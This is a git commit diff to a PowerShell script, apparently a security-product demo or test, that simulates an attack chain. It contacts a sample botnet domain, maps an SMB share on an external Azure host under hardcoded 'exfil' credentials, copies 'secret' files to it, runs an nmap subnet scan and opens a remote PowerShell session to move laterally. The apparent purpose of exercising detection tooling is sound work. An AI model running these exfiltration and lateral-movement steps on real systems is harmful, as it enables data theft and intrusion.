a9d60a9f8c9b131b8884145ae24ed9478c2217cb
bassmandan <daniel@thehardingfamily.org.uk>
2024-12-10 15:44:13 +0000

    Update movement.ps1

--- movement.ps1
+++ movement.ps1
@@ -1,26 +1,29 @@
+# Umbrella sample C2 domain
 $domain = "examplebotnetdomain.com"
-$nslookupResult = nslookup $domain
 
-# Output the results of nslookup
-Write-Output "NSLookup results for ${domain}:"
-Write-Output $nslookupResult
+# HTTP web request
+Invoke-WebRequest $domain
 
-# Install Powershell NMap module
-Install-Module -Name PSnmap -Scope CurrentUser -Force
-# Run NMap scan on local subnet
-Invoke-PSnmap -Cn 10.10.10.0/24 -ScanOnPingFail -Port 443, 3389, 22 -Dns -PortConnectTimeoutMs 1000 -AddService
-
+# Extfiltrate file
 # Create new file share link
 New-SmbMapping -RemotePath '\\xdr-datastorehost.westeurope.cloudapp.azure.com\exfilFiles' -TransportType QUIC -SkipCertificateCheck -UserName 'exfil' -Password 'C1sco12345' -LocalPath 'Z:'
 # Copy temp file to remote share
 copy 'C:\Temp\super-secret-db.db' 'Z:\'
 
+# Install Powershell NMap module
+Install-Module -Name PSnmap -Scope CurrentUser -Force
+# Run NMap scan on firewalled subnet
+Invoke-PSnmap -Cn 10.200.200.0/24 -ScanOnPingFail -Port 443, 3389, 22, 5985, 5986 -Dns -PortConnectTimeoutMs 1000 -AddService
+
 # Connect to remote device
-Enter-PSSession 10.10.10.91
+Enter-PSSession 10.200.200.70
+
+# Exfiltrate file
 # Create new file share link
 New-SmbMapping -RemotePath '\\xdr-datastorehost.westeurope.cloudapp.azure.com\exfilFiles' -TransportType QUIC -SkipCertificateCheck -UserName 'exfil' -Password 'C1sco12345' -LocalPath 'Z:'
 # Copy temp file to remote share
 copy 'C:\Temp\secret-data.txt' 'Z:\'
+
 # Exit remote device
 Exit-PSSession
 
